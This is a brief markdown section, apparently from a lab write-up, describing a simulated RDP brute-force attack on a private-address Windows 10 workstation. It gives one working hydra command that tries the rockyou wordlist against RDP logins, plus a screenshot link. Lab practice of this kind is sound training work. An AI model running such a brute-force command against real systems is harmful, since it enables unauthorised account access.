## Simulated Attack: RDP Brute-Force  

### Target  
- **Windows 10 Workstation**: `192.168.10.20` (RDP port `3389`).  

### Attack Command (Kali Linux)  
```bash
hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.10.20
```



![Captura de ecrã 2025-03-16 041244](https://github.com/user-attachments/assets/34501442-2c73-4697-a19d-5d397f631ab2)
